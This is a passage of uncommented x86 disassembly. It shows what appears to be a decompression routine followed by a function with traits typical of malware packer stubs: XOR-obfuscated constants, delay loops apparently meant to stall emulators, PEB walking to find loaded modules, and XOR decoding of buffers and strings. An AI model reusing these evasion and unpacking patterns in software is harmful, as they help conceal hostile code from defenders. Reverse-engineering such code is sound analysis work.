  416d6e:	dec    esi
  416d6f:	jne    0x416d5d
  416d71:	jmp    0x416d73
  416d73:	inc    DWORD PTR [ebp-0x24]
  416d76:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d79:	add    ecx,0x2
  416d7c:	mov    edi,DWORD PTR [ebp-0x4]
  416d7f:	mov    eax,edi
  416d81:	sub    eax,DWORD PTR [ebp+0x24]
  416d84:	cmp    DWORD PTR [ebp-0x24],eax
  416d87:	ja     0x416dd3
  416d89:	mov    esi,edi
  416d8b:	sub    esi,DWORD PTR [ebp-0x24]
  416d8e:	mov    edx,DWORD PTR [ebp+0x28]
  416d91:	lods   al,BYTE PTR ds:[esi]
  416d92:	stos   BYTE PTR es:[edi],al
  416d93:	cmp    edi,edx
  416d95:	jae    0x416d9a
  416d97:	dec    ecx
  416d98:	jne    0x416d91
  416d9a:	mov    DWORD PTR [ebp-0x4],edi
  416d9d:	movzx  esi,al
  416da0:	cmp    edi,DWORD PTR [ebp+0x28]
  416da3:	jb     0x416b04
  416da9:	call   0x416dd8
  416dae:	sub    eax,eax
  416db0:	lea    ebp,[esp+0x3c]
  416db4:	mov    edx,DWORD PTR [ebp+0x20]
  416db7:	mov    esi,DWORD PTR [ebp-0x8]
  416dba:	sub    esi,DWORD PTR [ebp+0x18]
  416dbd:	mov    DWORD PTR [edx],esi
  416dbf:	mov    edx,DWORD PTR [ebp+0x2c]
  416dc2:	mov    edi,DWORD PTR [ebp-0x4]
  416dc5:	sub    edi,DWORD PTR [ebp+0x24]
  416dc8:	mov    DWORD PTR [edx],edi
  416dca:	leave  
  416dcb:	pop    ebx
  416dcc:	pop    esi
  416dcd:	pop    edi
  416dce:	ret    0x1c
  416dd1:	pop    esi
  416dd2:	pop    eax
  416dd3:	sub    eax,eax
  416dd5:	inc    eax
  416dd6:	jmp    0x416db0
  416dd8:	cmp    ebx,0x1000000
  416dde:	jb     0x416de1
  416de0:	ret    
  416de1:	shl    ebx,0x8
  416de4:	push   esi
  416de5:	mov    esi,DWORD PTR [ebp-0x8]
  416de8:	cmp    esi,DWORD PTR [ebp+0x1c]
  416deb:	jae    0x416dd1
  416ded:	mov    eax,DWORD PTR [ebp-0x20]
  416df0:	shl    eax,0x8
  416df3:	lods   al,BYTE PTR ds:[esi]
  416df4:	mov    DWORD PTR [ebp-0x20],eax
  416df7:	mov    DWORD PTR [ebp-0x8],esi
  416dfa:	pop    esi
  416dfb:	ret    
  416dfc:	mov    ecx,DWORD PTR [ebp-0x3c]
  416dff:	movzx  eax,al
  416e02:	shl    ecx,0x4
  416e05:	add    eax,DWORD PTR [ebp-0x18]
  416e08:	add    eax,ecx
  416e0a:	jmp    0x416e12
  416e0c:	movzx  eax,al
  416e0f:	add    eax,DWORD PTR [ebp-0x3c]
  416e12:	mov    ebp,DWORD PTR [ebp-0x38]
  416e15:	lea    ebp,[ebp+eax*2+0x0]
  416e19:	sub    eax,eax
  416e1b:	lea    ebp,[ebp+eax*2+0x0]
  416e1f:	cmp    ebx,0x1000000
  416e25:	jae    0x416e43
  416e27:	mov    ecx,DWORD PTR [esp+0x38]
  416e2b:	shl    DWORD PTR [esp+0x20],0x8
  416e30:	cmp    ecx,DWORD PTR [esp+0x5c]
  416e34:	jae    0x416dd2
  416e36:	mov    dl,BYTE PTR [ecx]
  416e38:	inc    DWORD PTR [esp+0x38]
  416e3c:	shl    ebx,0x8
  416e3f:	mov    BYTE PTR [esp+0x20],dl
  416e43:	mov    ecx,ebx
  416e45:	movzx  edx,WORD PTR [ebp+0x0]
  416e49:	shr    ecx,0xb
  416e4c:	imul   ecx,edx
  416e4f:	cmp    DWORD PTR [esp+0x20],ecx
  416e53:	jae    0x416e6c
  416e55:	mov    ebx,ecx
  416e57:	mov    ecx,0x800
  416e5c:	sub    ecx,edx
  416e5e:	shr    ecx,0x5
  416e61:	add    WORD PTR [ebp+0x0],cx
  416e65:	add    eax,eax
  416e67:	lea    ebp,[esp+0x40]
  416e6b:	ret    
  416e6c:	shr    edx,0x5
  416e6f:	sub    DWORD PTR [esp+0x20],ecx
  416e73:	sub    ebx,ecx
  416e75:	sub    WORD PTR [ebp+0x0],dx
  416e79:	add    eax,eax
  416e7b:	add    eax,0x1
  416e7e:	lea    ebp,[esp+0x40]
  416e82:	ret    
  416e83:	push   ebp
  416e84:	mov    ebp,esp
  416e86:	sub    esp,0x104
  416e8c:	push   ebx
  416e8d:	push   esi
  416e8e:	push   edi
  416e8f:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  416e96:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  416e9d:	mov    eax,DWORD PTR [ebp+0x8]
  416ea0:	mov    DWORD PTR [ebp+0x8],eax
  416ea3:	mov    ecx,DWORD PTR [ebp-0x14]
  416ea6:	mov    ebx,0x751089b
  416eab:	xor    ecx,ebx
  416ead:	mov    eax,0x3272e2
  416eb2:	add    ecx,eax
  416eb4:	mov    DWORD PTR [ebp-0x2c],ecx
  416eb7:	mov    ecx,DWORD PTR [ebp-0x14]
  416eba:	xor    ecx,ebx
  416ebc:	add    ecx,eax
  416ebe:	mov    DWORD PTR [ebp-0x3c],ecx
  416ec1:	mov    ecx,DWORD PTR [ebp-0x14]
  416ec4:	xor    ecx,ebx
  416ec6:	add    ecx,eax
  416ec8:	mov    DWORD PTR [ebp-0x40],ecx
  416ecb:	mov    ecx,DWORD PTR [ebp-0x14]
  416ece:	xor    ecx,ebx
  416ed0:	add    ecx,eax
  416ed2:	mov    DWORD PTR [ebp-0xa0],ecx
  416ed8:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  416edf:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  416ee6:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  416eed:	push   0x25
  416eef:	pop    ecx
  416ef0:	mov    DWORD PTR [ebp-0x34],ecx
  416ef3:	mov    DWORD PTR [ebp-0x34],ecx
  416ef6:	push   0x65
  416ef8:	pop    ecx
  416ef9:	mov    DWORD PTR [ebp-0x34],ecx
  416efc:	mov    DWORD PTR [ebp-0x34],ecx
  416eff:	mov    DWORD PTR [ebp-0x34],0x4d
  416f06:	mov    DWORD PTR [ebp-0x34],0x43
  416f0d:	mov    ecx,DWORD PTR [ebp-0x14]
  416f10:	xor    ecx,ebx
  416f12:	add    ecx,eax
  416f14:	mov    DWORD PTR [ebp-0x34],ecx
  416f17:	mov    ecx,DWORD PTR [ebp-0x14]
  416f1a:	xor    ecx,ebx
  416f1c:	add    ecx,eax
  416f1e:	mov    DWORD PTR [ebp-0x34],ecx
  416f21:	mov    DWORD PTR [ebp-0x28],0x257
  416f28:	mov    DWORD PTR [ebp-0x20],0x35
  416f2f:	mov    DWORD PTR [ebp-0x10],0x79
  416f36:	lea    edi,[ebp-0xe4]
  416f3c:	lea    esi,[ebp-0x104]
  416f42:	call   0x417b5e
  416f47:	dec    DWORD PTR [ebp-0x10]
  416f4a:	jne    0x416f36
  416f4c:	dec    DWORD PTR [ebp-0x20]
  416f4f:	jne    0x416f2f
  416f51:	dec    DWORD PTR [ebp-0x28]
  416f54:	jne    0x416f28
  416f56:	mov    DWORD PTR [ebp-0x28],0x400d
  416f5d:	mov    eax,DWORD PTR [ebp-0x14]
  416f60:	xor    eax,ebx
  416f62:	mov    esi,0x3272e2
  416f67:	add    eax,esi
  416f69:	mov    DWORD PTR [ebp-0x8],eax
  416f6c:	mov    eax,DWORD PTR [ebp-0x14]
  416f6f:	and    DWORD PTR [ebp-0x94],0x0
  416f76:	xor    eax,ebx
  416f78:	add    eax,esi
  416f7a:	mov    DWORD PTR [ebp-0x38],eax
  416f7d:	mov    eax,fs:0x18
  416f83:	mov    DWORD PTR [ebp-0x94],eax
  416f89:	mov    eax,DWORD PTR [eax+0x30]
  416f8c:	mov    DWORD PTR [ebp-0x98],eax
  416f92:	mov    eax,DWORD PTR [eax+0xc]
  416f95:	mov    DWORD PTR [ebp-0xc0],eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x8]
  416f9e:	lea    ecx,[ebp-0x94]
  416fa4:	mov    DWORD PTR [eax+0x1a0],ecx
  416faa:	mov    eax,DWORD PTR [ebp+0x8]
  416fad:	lea    ecx,[ebp-0x98]
  416fb3:	mov    DWORD PTR [eax+0x1a4],ecx
  416fb9:	mov    eax,DWORD PTR [ebp+0x8]
  416fbc:	push   DWORD PTR [ebp+0x8]
  416fbf:	lea    ecx,[ebp-0xc0]
  416fc5:	mov    DWORD PTR [eax+0x1a8],ecx
  416fcb:	call   0x419344
  416fd0:	mov    ecx,DWORD PTR [ebp-0x14]
  416fd3:	xor    ecx,ebx
  416fd5:	add    ecx,esi
  416fd7:	cmp    ecx,eax
  416fd9:	je     0x4172b6
  416fdf:	mov    eax,DWORD PTR [ebp+0x8]
  416fe2:	mov    eax,DWORD PTR [eax+0x194]
  416fe8:	mov    ecx,DWORD PTR [eax]
  416fea:	mov    eax,DWORD PTR [ebp+0x8]
  416fed:	mov    eax,DWORD PTR [eax+0x194]
  416ff3:	mov    eax,DWORD PTR [eax]
  416ff5:	add    eax,DWORD PTR [ecx+0x3c]
  416ff8:	mov    ecx,DWORD PTR [ebp+0x8]
  416ffb:	mov    ecx,DWORD PTR [ecx+0x1d8]
  417001:	lea    edx,[ebp-0xc4]
  417007:	push   edx
  417008:	mov    edx,DWORD PTR [ebp+0x8]
  41700b:	mov    edx,DWORD PTR [edx+0x18c]
  417011:	mov    edx,DWORD PTR [edx]
  417013:	add    edx,DWORD PTR [eax+0x88]
  417019:	push   0x4
  41701b:	push   DWORD PTR [eax+0x8c]
  417021:	push   edx
  417022:	call   DWORD PTR [ecx+0x1c]
  417025:	push   DWORD PTR [ebp+0x8]
  417028:	mov    edi,DWORD PTR [ebp+0x8]
  41702b:	mov    eax,DWORD PTR [ebp+0x8]
  41702e:	mov    edx,DWORD PTR [eax+0x1b8]
  417034:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41703b:	mov    DWORD PTR [ebp-0x64],0x50c011f
  417042:	mov    WORD PTR [ebp-0x60],0x7c3d
  417048:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  417052:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41705c:	mov    DWORD PTR [ebp-0x88],0x221d040c
  417066:	mov    DWORD PTR [ebp-0x84],0xe190109
  417070:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  417077:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41707e:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  417085:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41708c:	mov    DWORD PTR [ebp-0x70],0xe190109
  417093:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41709a:	call   0x419373
  41709f:	push   eax
  4170a0:	mov    eax,DWORD PTR [ebp+0x8]
  4170a3:	mov    eax,DWORD PTR [eax+0x1a8]
  4170a9:	push   DWORD PTR [eax]
  4170ab:	call   0x419014
  4170b0:	test   eax,eax
  4170b2:	jne    0x417104
  4170b4:	mov    eax,DWORD PTR [ebp+0x8]
  4170b7:	mov    eax,DWORD PTR [eax+0x1d8]
  4170bd:	mov    edi,DWORD PTR [ebp+0x8]
  4170c0:	add    eax,0x4
  4170c3:	mov    DWORD PTR [ebp-0x24],eax
  4170c6:	mov    eax,DWORD PTR [ebp+0x8]
  4170c9:	mov    edx,DWORD PTR [eax+0x1b8]
  4170cf:	call   0x419373
  4170d4:	push   eax
  4170d5:	mov    eax,DWORD PTR [ebp-0x24]
  4170d8:	call   DWORD PTR [eax]
  4170da:	test   eax,eax
  4170dc:	jne    0x417104
  4170de:	mov    eax,DWORD PTR [ebp+0x8]
  4170e1:	mov    eax,DWORD PTR [eax+0x1d8]
  4170e7:	mov    edi,DWORD PTR [ebp+0x8]
  4170ea:	add    eax,0x10
  4170ed:	mov    DWORD PTR [ebp-0x24],eax
  4170f0:	mov    eax,DWORD PTR [ebp+0x8]
  4170f3:	mov    edx,DWORD PTR [eax+0x1b8]
  4170f9:	call   0x419373
  4170fe:	push   eax
  4170ff:	mov    eax,DWORD PTR [ebp-0x24]
  417102:	call   DWORD PTR [eax]
  417104:	mov    eax,DWORD PTR [ebp-0x14]
  417107:	mov    ecx,DWORD PTR [ebp-0x28]
  41710a:	xor    eax,ebx
  41710c:	add    eax,esi
  41710e:	cmp    eax,ecx
  417110:	je     0x41728f
  417116:	mov    eax,DWORD PTR [ebp-0x18]
  417119:	xor    eax,ebx
  41711b:	mov    ecx,0xffcd8d1e
  417120:	sub    ecx,eax
  417122:	add    ecx,DWORD PTR [ebp-0x28]
  417125:	mov    eax,DWORD PTR [ebp-0x8]
  417128:	cmp    eax,ecx
  41712a:	ja     0x41728f
  417130:	mov    DWORD PTR [ebp-0x20],0x0
  417137:	push   DWORD PTR [ebp+0x8]
  41713a:	mov    edi,DWORD PTR [ebp+0x8]
  41713d:	mov    eax,DWORD PTR [ebp+0x8]
  417140:	mov    edx,DWORD PTR [eax+0x1b4]
  417146:	call   0x419373
  41714b:	push   eax
  41714c:	mov    eax,DWORD PTR [ebp+0x8]
  41714f:	mov    eax,DWORD PTR [eax+0x1a8]
  417155:	push   DWORD PTR [eax]
  417157:	call   0x419014
  41715c:	mov    ecx,DWORD PTR [ebp+0x8]
  41715f:	mov    ecx,DWORD PTR [ecx+0x19c]
  417165:	mov    DWORD PTR [ecx],eax
  417167:	mov    eax,DWORD PTR [ebp+0x8]
  41716a:	mov    edi,DWORD PTR [eax+0x1d8]
  417170:	mov    esi,DWORD PTR [ebp+0x8]
  417173:	xor    eax,eax
  417175:	lea    edx,[ebp-0x7c]
  417178:	call   0x4193a9
  41717d:	push   eax
  41717e:	mov    eax,DWORD PTR [ebp+0x8]
  417181:	mov    eax,DWORD PTR [eax+0x19c]
  417187:	push   DWORD PTR [eax]
  417189:	call   DWORD PTR [edi+0x8]
  41718c:	mov    DWORD PTR [ebp-0x24],eax
  41718f:	mov    eax,DWORD PTR [ebp+0x8]
  417192:	mov    edi,DWORD PTR [eax+0x1d8]
  417198:	mov    esi,DWORD PTR [ebp+0x8]
  41719b:	xor    eax,eax
  41719d:	lea    edx,[ebp-0x90]
  4171a3:	call   0x4193a9
  4171a8:	push   eax
  4171a9:	mov    eax,DWORD PTR [ebp+0x8]
  4171ac:	mov    eax,DWORD PTR [eax+0x19c]
  4171b2:	push   DWORD PTR [eax]
  4171b4:	call   DWORD PTR [edi+0x8]
  4171b7:	and    DWORD PTR [ebp-0x1c],0x0
  4171bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4171be:	and    eax,0x7
  4171c1:	add    eax,0x31
  4171c4:	push   eax
  4171c5:	call   DWORD PTR [ebp-0x24]
  4171c8:	test   eax,eax
  4171ca:	jne    0x4171d1
  4171cc:	and    DWORD PTR [ebp-0x10],eax
  4171cf:	jmp    0x4171f9
  4171d1:	mov    eax,DWORD PTR [ebp+0x8]
  4171d4:	mov    edi,DWORD PTR [eax+0x1d8]
  4171da:	mov    esi,DWORD PTR [ebp+0x8]
  4171dd:	xor    eax,eax
  4171df:	lea    edx,[ebp-0x68]
  4171e2:	call   0x4193a9
  4171e7:	push   eax
  4171e8:	mov    eax,DWORD PTR [ebp+0x8]
  4171eb:	mov    eax,DWORD PTR [eax+0x198]
  4171f1:	push   DWORD PTR [eax]
  4171f3:	call   DWORD PTR [edi+0x8]
  4171f6:	mov    DWORD PTR [ebp-0x10],eax
  4171f9:	inc    DWORD PTR [ebp-0x1c]
  4171fc:	cmp    DWORD PTR [ebp-0x1c],0x10
  417200:	jb     0x4171bb
  417202:	mov    eax,DWORD PTR [ebp-0x18]
  417205:	mov    esi,DWORD PTR [ebp+0x8]
  417208:	xor    eax,ebx
  41720a:	mov    edi,0x3272e2
  41720f:	add    eax,edi
  417211:	lea    edx,[ebp-0xe4]
  417217:	call   0x4193a9
  41721c:	push   eax
  41721d:	mov    eax,DWORD PTR [ebp-0x14]
  417220:	mov    esi,DWORD PTR [ebp+0x8]
  417223:	xor    eax,ebx
  417225:	add    eax,edi
  417227:	lea    edx,[ebp-0x104]
  41722d:	call   0x4193a9
  417232:	push   eax
  417233:	call   DWORD PTR [ebp-0x10]
  417236:	mov    ecx,DWORD PTR [ebp-0x14]
  417239:	xor    ecx,ebx
  41723b:	add    ecx,edi
  41723d:	cmp    ecx,eax
  41723f:	jne    0x417248
  417241:	mov    DWORD PTR [ebp-0x20],0x1
  417248:	mov    eax,DWORD PTR [ebp-0x18]
  41724b:	mov    ecx,DWORD PTR [ebp-0x8]
  41724e:	xor    eax,ebx
  417250:	lea    eax,[eax+ecx*1+0x3272e2]
  417257:	mov    DWORD PTR [ebp-0x8],eax
  41725a:	mov    eax,DWORD PTR [ebp-0x20]
  41725d:	test   eax,eax
  41725f:	je     0x417273
  417261:	mov    eax,DWORD PTR [ebp-0x18]
  417264:	mov    ecx,DWORD PTR [ebp-0x38]
  417267:	xor    eax,ebx
  417269:	lea    eax,[eax+ecx*1+0x3272e2]
  417270:	mov    DWORD PTR [ebp-0x38],eax
  417273:	mov    eax,DWORD PTR [ebp-0x18]
  417276:	xor    eax,ebx
  417278:	mov    ecx,0xffcd8d1e
  41727d:	sub    ecx,eax
  41727f:	add    ecx,DWORD PTR [ebp-0x28]
  417282:	mov    eax,DWORD PTR [ebp-0x8]
  417285:	cmp    eax,ecx
  417287:	jbe    0x417130
  41728d:	mov    esi,edi
  41728f:	mov    eax,DWORD PTR [ebp-0x38]
  417292:	mov    ecx,DWORD PTR [ebp-0x8]
  417295:	cmp    ecx,eax
  417297:	jne    0x4172aa
  417299:	push   DWORD PTR [ebp+0x8]
  41729c:	lea    eax,[ebp-0x3c]
  41729f:	push   eax
  4172a0:	call   0x419e21
  4172a5:	mov    DWORD PTR [ebp-0x2c],eax
  4172a8:	jmp    0x4172b6
  4172aa:	mov    eax,DWORD PTR [ebp-0x2c]
  4172ad:	mov    ecx,DWORD PTR [ebp-0x18]
  4172b0:	xor    ecx,ebx
  4172b2:	add    ecx,esi
  4172b4:	xor    DWORD PTR [eax],ecx
  4172b6:	mov    eax,DWORD PTR [ebp-0x14]
  4172b9:	mov    ecx,DWORD PTR [ebp-0x2c]
  4172bc:	xor    eax,ebx
  4172be:	add    eax,esi
  4172c0:	cmp    eax,ecx
  4172c2:	je     0x417a3c
  4172c8:	mov    eax,DWORD PTR [ebp-0x14]
  4172cb:	mov    ecx,DWORD PTR [ebp-0x3c]
  4172ce:	xor    eax,ebx
  4172d0:	add    eax,esi
  4172d2:	cmp    eax,ecx
  4172d4:	je     0x417a3c
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	xor    eax,ebx
  4172df:	add    eax,esi
  4172e1:	jmp    0x4172ff
  4172e3:	mov    edi,DWORD PTR [ebp-0x2c]
  4172e6:	mov    cl,al
  4172e8:	and    cl,0x1f
  4172eb:	or     dl,0xff
  4172ee:	sub    dl,cl
  4172f0:	add    BYTE PTR [edi+eax*1],dl
  4172f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4172f6:	xor    ecx,ebx
  4172f8:	lea    eax,[eax+ecx*1+0x3272e2]
  4172ff:	mov    ecx,DWORD PTR [ebp-0x3c]
  417302:	cmp    eax,ecx
  417304:	jb     0x4172e3
  417306:	mov    eax,DWORD PTR [ebp-0x3c]
  417309:	mov    DWORD PTR [ebp-0x28],eax
  41730c:	mov    eax,DWORD PTR [ebp-0x2c]
  41730f:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  417316:	mov    DWORD PTR [ebp-0xbc],eax
  41731c:	mov    edi,0xf89c8584
  417321:	mov    DWORD PTR [ebp-0x30],edi
  417324:	mov    eax,DWORD PTR [ebp-0x38]
  417327:	xor    eax,ebx
  417329:	add    eax,esi
  41732b:	mov    DWORD PTR [ebp-0xc],eax
  41732e:	mov    eax,DWORD PTR [ebp-0x38]
  417331:	xor    eax,ebx
  417333:	add    eax,esi
  417335:	mov    DWORD PTR [ebp-0x8],eax
  417338:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41733f:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  417346:	mov    eax,DWORD PTR [ebp-0x38]
  417349:	mov    ecx,DWORD PTR [ebp-0x28]
  41734c:	xor    eax,ebx
  41734e:	add    eax,esi
  417350:	cmp    ecx,eax
  417352:	je     0x417551
  417358:	jmp    0x41752d
  41735d:	mov    ecx,DWORD PTR [ebp-0xc]
  417360:	mov    eax,DWORD PTR [ebp-0x28]
  417363:	sub    eax,ecx
  417365:	mov    ecx,DWORD PTR [ebp-0x48]
  417368:	xor    ecx,ebx
  41736a:	add    ecx,esi
  41736c:	xor    edx,edx
  41736e:	div    ecx
  417370:	mov    DWORD PTR [ebp-0x8],eax
  417373:	mov    eax,DWORD PTR [ebp-0x54]
  417376:	mov    ecx,DWORD PTR [ebp-0x8]
  417379:	xor    eax,ebx
  41737b:	add    eax,esi
  41737d:	cmp    ecx,eax
  41737f:	jbe    0x41738b
  417381:	mov    eax,DWORD PTR [ebp-0x54]
  417384:	xor    eax,ebx
  417386:	add    eax,esi
  417388:	mov    DWORD PTR [ebp-0x8],eax
  41738b:	mov    eax,DWORD PTR [ebp-0x48]
  41738e:	mov    ecx,DWORD PTR [ebp-0x8]
  417391:	xor    eax,ebx
  417393:	add    eax,esi
  417395:	imul   eax,ecx
  417398:	mov    DWORD PTR [ebp-0x8],eax
  41739b:	mov    eax,DWORD PTR [ebp-0x38]
  41739e:	mov    ecx,DWORD PTR [ebp-0x8]
  4173a1:	xor    eax,ebx
  4173a3:	add    eax,esi
  4173a5:	cmp    ecx,eax
  4173a7:	je     0x41751b
  4173ad:	mov    eax,DWORD PTR [ebp-0x8]
  4173b0:	mov    DWORD PTR [ebp-0x10],eax
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	add    eax,DWORD PTR [ebp-0xbc]
  4173bc:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  4173c3:	mov    DWORD PTR [ebp-0x20],edi
  4173c6:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  4173d0:	mov    DWORD PTR [ebp-0x8],eax
  4173d3:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  4173da:	mov    DWORD PTR [ebp-0x1c],edi
  4173dd:	mov    eax,DWORD PTR [ebp-0x24]
  4173e0:	xor    eax,ebx
  4173e2:	add    eax,esi
  4173e4:	jmp    0x4174da
  4173e9:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  4173f3:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  4173fd:	mov    eax,DWORD PTR [ebp-0x1c]
  417400:	mov    ecx,DWORD PTR [ebp-0x44]
  417403:	xor    eax,ebx
  417405:	add    eax,esi
  417407:	imul   eax,ecx
  41740a:	mov    ecx,DWORD PTR [ebp-0x8]
  41740d:	mov    al,BYTE PTR [eax+ecx*1]
  417410:	mov    BYTE PTR [ebp-0x2],al
  417413:	mov    eax,DWORD PTR [ebp-0x1c]
  417416:	mov    ecx,DWORD PTR [ebp-0x44]
  417419:	xor    eax,ebx
  41741b:	add    eax,esi
  41741d:	imul   eax,ecx
  417420:	mov    ecx,DWORD PTR [ebp-0xa8]
  417426:	xor    ecx,ebx
  417428:	add    eax,ecx
  41742a:	mov    ecx,DWORD PTR [ebp-0x8]
  41742d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417435:	mov    ecx,DWORD PTR [ebp-0xb0]
  41743b:	xor    ecx,ebx
  41743d:	lea    eax,[ecx+eax*1+0x3272e2]
  417444:	movzx  ecx,BYTE PTR [ebp-0x2]
  417448:	xor    ecx,eax
  41744a:	mov    BYTE PTR [ebp-0x2],cl
  41744d:	mov    al,BYTE PTR [ebp-0x2]
  417450:	mov    ecx,DWORD PTR [ebp-0x1c]
  417453:	mov    edx,DWORD PTR [ebp-0x44]
  417456:	xor    ecx,ebx
  417458:	add    ecx,esi
  41745a:	imul   ecx,edx
  41745d:	mov    edx,DWORD PTR [ebp-0x8]
  417460:	mov    BYTE PTR [ecx+edx*1],al
  417463:	mov    eax,DWORD PTR [ebp-0x1c]
  417466:	mov    ecx,DWORD PTR [ebp-0x44]
  417469:	xor    eax,ebx
  41746b:	add    eax,esi
  41746d:	imul   eax,ecx
  417470:	mov    ecx,DWORD PTR [ebp-0x8]
  417473:	mov    al,BYTE PTR [eax+ecx*1]
  417476:	mov    BYTE PTR [ebp-0x2],al
  417479:	mov    eax,DWORD PTR [ebp-0x1c]
  41747c:	mov    ecx,DWORD PTR [ebp-0x44]
  41747f:	xor    eax,ebx
  417481:	add    eax,esi
  417483:	imul   eax,ecx
  417486:	mov    ecx,DWORD PTR [ebp-0x20]
  417489:	xor    ecx,ebx
  41748b:	add    eax,ecx
  41748d:	mov    ecx,DWORD PTR [ebp-0x8]
  417490:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417498:	mov    ecx,DWORD PTR [ebp-0xb8]
  41749e:	xor    ecx,ebx
  4174a0:	lea    eax,[ecx+eax*1+0x3272e2]
  4174a7:	movzx  ecx,BYTE PTR [ebp-0x2]
  4174ab:	xor    ecx,eax
  4174ad:	mov    BYTE PTR [ebp-0x2],cl
  4174b0:	mov    al,BYTE PTR [ebp-0x2]
  4174b3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4174b6:	mov    edx,DWORD PTR [ebp-0x44]
  4174b9:	xor    ecx,ebx
  4174bb:	add    ecx,esi
  4174bd:	imul   ecx,edx
  4174c0:	mov    edx,DWORD PTR [ebp-0x8]
  4174c3:	mov    BYTE PTR [ecx+edx*1],al
  4174c6:	mov    eax,DWORD PTR [ebp-0x34]
  4174c9:	mov    ecx,DWORD PTR [ebp-0x20]
  4174cc:	xor    eax,ebx
  4174ce:	xor    ecx,ebx
  4174d0:	add    eax,esi
  4174d2:	add    ecx,esi
  4174d4:	imul   eax,ecx
  4174d7:	add    eax,DWORD PTR [ebp-0x44]
  4174da:	mov    DWORD PTR [ebp-0x44],eax
  4174dd:	mov    eax,DWORD PTR [ebp-0x44]
  4174e0:	mov    ecx,DWORD PTR [ebp-0x10]
  4174e3:	cmp    ecx,eax
  4174e5:	jb     0x4173e9
  4174eb:	mov    eax,DWORD PTR [ebp-0x20]
  4174ee:	mov    ecx,DWORD PTR [ebp-0x10]
  4174f1:	xor    eax,ebx
  4174f3:	add    eax,esi
  4174f5:	imul   eax,ecx
  4174f8:	mov    ecx,DWORD PTR [ebp-0x24]
  4174fb:	xor    ecx,ebx
  4174fd:	add    ecx,esi
  4174ff:	or     eax,ecx
  417501:	mov    ecx,DWORD PTR [ebp-0x30]
  417504:	xor    ecx,ebx
  417506:	add    eax,ecx
  417508:	mov    ecx,DWORD PTR [ebp-0x30]
  41750b:	xor    ecx,ebx
  41750d:	add    eax,ecx
  41750f:	mov    ecx,DWORD PTR [ebp-0xc]
  417512:	lea    eax,[eax+ecx*1+0x64e5c4]
  417519:	jmp    0x41752a
  41751b:	mov    eax,DWORD PTR [ebp-0x30]
  41751e:	mov    ecx,DWORD PTR [ebp-0xc]
  417521:	xor    eax,ebx
  417523:	lea    eax,[eax+ecx*1+0x3272e2]
  41752a:	mov    DWORD PTR [ebp-0xc],eax
  41752d:	mov    eax,DWORD PTR [ebp-0x30]
  417530:	xor    eax,ebx
  417532:	mov    ecx,0xffcd8d1e
  417537:	sub    ecx,eax
  417539:	add    ecx,DWORD PTR [ebp-0x28]
  41753c:	mov    eax,DWORD PTR [ebp-0x30]
  41753f:	mov    edx,DWORD PTR [ebp-0xc]
  417542:	xor    eax,ebx
  417544:	add    eax,esi
  417546:	imul   eax,edx
  417549:	cmp    eax,ecx
  41754b:	jbe    0x41735d
  417551:	mov    eax,DWORD PTR [ebp-0x14]
  417554:	mov    ecx,DWORD PTR [ebp-0x3c]
  417557:	mov    eax,DWORD PTR [ebp+0x8]
  41755a:	mov    edx,DWORD PTR [ebp-0x4c]
  41755d:	mov    eax,DWORD PTR [eax+0x1d8]
  417563:	xor    edx,ebx
  417565:	add    edx,esi
  417567:	push   edx
  417568:	mov    edx,DWORD PTR [ebp-0x40]
  41756b:	xor    edx,ebx
  41756d:	add    edx,esi
  41756f:	push   edx
  417570:	push   ecx
  417571:	mov    DWORD PTR [ebp-0x34],ecx
  417574:	mov    ecx,DWORD PTR [ebp-0x14]
  417577:	xor    ecx,ebx
  417579:	add    ecx,esi
  41757b:	push   ecx
  41757c:	call   DWORD PTR [eax+0x14]
  41757f:	mov    edi,eax
  417581:	mov    eax,DWORD PTR [ebp-0x14]
  417584:	xor    eax,ebx
  417586:	add    eax,esi
  417588:	cmp    eax,edi
  41758a:	je     0x4175e5
  41758c:	mov    eax,DWORD PTR [ebp-0x14]
  41758f:	jmp    0x4175b2
  417591:	mov    ecx,DWORD PTR [ebp-0x2c]
  417594:	xor    eax,ebx
  417596:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41759d:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  4175a4:	mov    ecx,DWORD PTR [ebp-0x18]
  4175a7:	xor    ecx,ebx
  4175a9:	lea    eax,[ecx+eax*1+0x3272e2]
  4175b0:	xor    eax,ebx
  4175b2:	mov    ecx,DWORD PTR [ebp-0x3c]
  4175b5:	sub    ecx,esi
  4175b7:	xor    ecx,ebx
  4175b9:	cmp    eax,ecx
  4175bb:	jne    0x417591
  4175bd:	mov    eax,DWORD PTR [ebp+0x8]
  4175c0:	mov    ecx,DWORD PTR [ebp-0x50]
  4175c3:	mov    eax,DWORD PTR [eax+0x1d8]
  4175c9:	xor    ecx,ebx
  4175cb:	add    ecx,esi
  4175cd:	push   ecx
  4175ce:	mov    ecx,DWORD PTR [ebp-0x14]
  4175d1:	xor    ecx,ebx
  4175d3:	add    ecx,esi
